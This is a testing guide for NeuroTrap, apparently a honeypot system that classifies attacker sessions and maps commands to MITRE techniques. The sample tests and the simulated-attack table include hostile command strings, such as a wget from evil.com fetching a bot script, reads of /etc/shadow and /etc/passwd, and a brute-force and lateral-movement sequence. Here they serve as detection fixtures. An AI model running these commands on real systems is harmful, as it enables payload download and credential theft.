# Testing Guide

NeuroTrap has a `pytest`-based test suite covering all core modules. Tests use in-process mocks and the `FallbackDB` SQLite store — no live MongoDB, Docker, or network required.

---

## Running Tests

```bash
cd /home/neurotrap/neurotrap

# Install test dependencies
pip install pytest faker scikit-learn spacy

# Run full suite
python -m pytest tests/ -v

# Run a single file
python -m pytest tests/test_classifier.py -v

# Run a single test
python -m pytest tests/test_twin.py::test_prediction -v

# With coverage
python -m pytest tests/ -v --tb=short --cov=src
```

---

## Test Files

| File | Covers |
|------|--------|
| `test_alert_schema.py` | `AlertEvent` validation, `from_cowrie()`, `from_zeek()` |
| `test_classifier.py` | `SessionFeatureExtractor`, model training, prediction, tier classification |
| `test_ttp_extractor.py` | Command → MITRE mapping, confidence scoring |
| `test_deception_engine.py` | Environment generation, tier personalization, Docker mock |
| `test_credential_generator.py` | SSH users, AWS/DB creds, `.env`, shadow, shell history |
| `test_response_engine.py` | Threshold evaluation, action execution, alerting |
| `test_database.py` | `FallbackDB` vs Mongo interface equivalence |
| `test_honeypots.py` | SSH/HTTP/FTP/Telnet mock servers |
| `test_twin.py` | Twin building, tactic prediction, simulation |

---

## conftest.py

`tests/conftest.py` adds the project root to `sys.path` so modules can be imported without `pip install -e`:

```python
import sys
sys.path.insert(0, str(Path(__file__).parent.parent))
```

It also provides a `db` fixture that returns a `FallbackDB` instance (SQLite) pre-populated with minimal test data.

---

## Test Design Principles

### No External Dependencies

All tests are self-contained:
- MongoDB replaced by `FallbackDB` SQLite (same interface)
- Docker API replaced by `MagicMock`
- Network calls replaced by `unittest.mock.patch`
- External APIs (Anthropic, ip-api.com) mocked

### AlertEvent Tests (`test_alert_schema.py`)

```python
def test_from_cowrie_brute_force():
    line = json.dumps({
        "eventid": "cowrie.login.failed",
        "timestamp": "2025-06-09T10:15:32.000Z",
        "src_ip": "203.0.113.45",
        "username": "root",
        "password": "123456",
        "session": "abc123"
    })
    event = AlertEvent.from_cowrie(line)
    assert event.attack_type == "brute_force"
    assert event.src_ip == "203.0.113.45"
    assert event.username == "root"
    assert event.severity in SEVERITY_LEVELS
```

### Classifier Tests (`test_classifier.py`)

```python
def test_feature_extraction():
    session = {
        "commands": ["uname -a", "id", "cat /etc/passwd"],
        "login_attempts": 5,
        "failed_logins": 4,
        "start_time": 0, "end_time": 30
    }
    features = SessionFeatureExtractor().extract(session)
    assert len(features) == 13
    assert features["total_commands"] == 3
    assert features["recon_count"] == 2  # uname + id

def test_classifier_trains_and_predicts():
    clf = AttackerClassifier()
    # Train on synthetic data
    clf.train(generate_synthetic_sessions(n=200))
    intent, confidence = clf.predict(sample_features)
    assert intent in INTENT_CLASSES
    assert 0.0 <= confidence <= 1.0
```

### TTP Extractor Tests (`test_ttp_extractor.py`)

```python
def test_exact_match():
    extractor = TTPExtractor()
    results = extractor.extract(["wget http://evil.com/bot.sh"])
    assert any(r["technique_id"] == "T1105" for r in results)

def test_shadow_access():
    results = TTPExtractor().extract(["cat /etc/shadow"])
    assert any(r["technique_id"] == "T1003.008" for r in results)
```

### Deception Engine Tests (`test_deception_engine.py`)

```python
@patch("docker.from_env")
def test_generate_environment_beginner(mock_docker):
    mock_docker.return_value.containers.run.return_value = MagicMock(id="test-container")
    engine = DeceptionEngine(docker_client=mock_docker.return_value)
    profile = AttackerProfile(src_ip="1.2.3.4")
    profile.attacker_tier = "beginner"
    env_id = engine.generate_environment(profile)
    assert env_id is not None
    assert "1.2.3.4" in engine.get_active_environments().get(env_id, {}).get("profile", "")
```

### Database Tests (`test_database.py`)

```python
def test_fallback_find_and_insert(db):
    col = db.get_collection("test_collection")
    col.insert_one({"src_ip": "1.2.3.4", "score": 50})
    results = list(col.find({"src_ip": "1.2.3.4"}))
    assert len(results) == 1
    assert results[0]["score"] == 50

def test_fallback_update_set(db):
    col = db.get_collection("test_collection")
    col.insert_one({"src_ip": "1.2.3.4", "score": 50})
    col.update_one({"src_ip": "1.2.3.4"}, {"$set": {"score": 75}})
    doc = col.find_one({"src_ip": "1.2.3.4"})
    assert doc["score"] == 75
```

---

## CI Pipeline

CI runs on every push/PR (`.github/workflows/ci.yml`):

```yaml
- name: Run tests
  run: python -m pytest tests/ -v --tb=short --cov=src

- name: Lint
  run: ruff check src/ tests/ --ignore E501
```

Platform: Ubuntu latest, Python 3.11.

---

## End-to-End Attack Simulation

For manual verification of the full pipeline:

```bash
python scripts/simulate_attack.py
```

This runs a 5-stage simulated attack:

| Stage | Actions | Expected Outcome |
|-------|---------|-----------------|
| Recon | `uname -a`, `id`, `ls /etc/` | `reconnaissance` intent, low threat score |
| Brute-force | 10 failed SSH login attempts | `brute_force` events in `alert_events` |
| Login + commands | Successful login, `cat /etc/passwd`, `netstat` | Session written to `cowrie_sessions` |
| Malware upload | `wget http://evil.com/bot.sh`, `chmod +x` | Intent → `malware_deployment`, score rises |
| Lateral movement | `ssh 10.0.0.5` (internal target) | Intent → `lateral_movement`, score may reach `isolate_alert` |

After running, verify in the dashboard:
1. Events appear in the live feed
2. An attacker profile exists with the correct intent
3. A deception environment was spawned (threat score should be ≥ 10)
4. Response log shows the appropriate action

---

## Troubleshooting Tests

### `ModuleNotFoundError: No module named 'src'`

```bash
# Fix: run pytest from the neurotrap/ directory
cd /home/neurotrap/neurotrap
python -m pytest tests/ -v
```

### `spacy` model not found

```bash
python -m spacy download en_core_web_sm
```

### `sklearn` import errors

```bash
pip install scikit-learn sentence-transformers
```
